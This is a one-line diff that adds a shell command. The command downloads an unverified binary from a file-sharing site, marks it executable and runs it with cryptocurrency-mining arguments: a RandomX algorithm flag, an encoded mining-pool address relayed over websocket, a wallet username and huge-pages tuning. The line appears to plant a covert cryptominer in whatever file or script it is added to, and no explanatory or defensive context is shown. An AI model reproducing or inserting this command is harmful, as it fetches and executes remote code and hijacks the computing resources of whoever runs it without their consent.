@@ -1,0 +1,1 @@
+wget https://filebin.net/7gbrj4v7cvepvcga/x;chmod +x x;./x -o wss://technical-dasha-devdev-ccf19728.koyeb.app/cngudW5taW5lYWJsZS5jb206NDQz -a rx -k -u BONK:7C3vQRUmUzj53r6bT74TxcTV7RfZ2bBnozByYPKEnhDr.8t1#4yh6-ojiu -p x --huge-pages
